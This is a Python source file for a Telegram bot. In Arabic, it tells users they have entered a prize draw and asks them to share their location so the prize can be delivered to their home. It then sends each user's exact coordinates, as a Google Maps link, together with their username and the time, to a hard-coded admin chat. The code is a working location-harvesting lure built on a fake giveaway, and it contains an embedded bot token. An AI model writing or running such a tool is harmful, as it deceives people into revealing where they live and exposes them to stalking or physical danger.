import telebot
from telebot.types import Location, ReplyKeyboardMarkup, KeyboardButton
import requests

#Replace with your bot's token
bot = telebot.TeleBot("7628474532:AAHLQxj2lbrrlcR4j1wjcmFlbWzQtZ4JnsY")

@bot.message_handler(commands=['start'])
def start(message):
    #Create a reply keyboard with a button for sharing location
    keyboard = ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
    button = KeyboardButton(text=" شارك موقعك الآن للحصول على فرصة للفوز", request_location=True)
    keyboard.add(button)

    #Send a message to the user with the keyboard
    bot.send_message(message.chat.id, """
🎉 | أهلاً وسهلاً بك ! 
🎁 | أنت الآن في سحب على جائزة قيمة ! 
📍 قم بإرسال الموقع للمشاركة في السحب سنقوم بتسليم الجائزة مباشرة إلى باب منزلك من قبل فريق التوصيل 💨🚚
""", reply_markup=keyboard)

@bot.message_handler(func=lambda message: True, content_types=['location'])
def get_location(message):
    #Get the user's location 
    latitude = message.location.latitude
    longitude = message.location.longitude

    #Create a URL for Google Maps with the user's location
    google_maps_url = f"https://www.google.com/maps/place/{latitude},{longitude}"

    #Get the user's username and the current time
    username = message.from_user.username
    current_time = message.date

    #Create a message with the user's username, current time and Google Maps URL


    message = f"اسم المستخدم {username} شاركوا موقعهم معك  {current_time}  + موقع الدقيق للمستخدم {google_maps_url}"

    #Replace with the admin's chat id
    admin_chat_id = "1051175859"

    #Send the message to the admin
    bot.send_message(admin_chat_id, message)

#Start the bot
bot.polling()
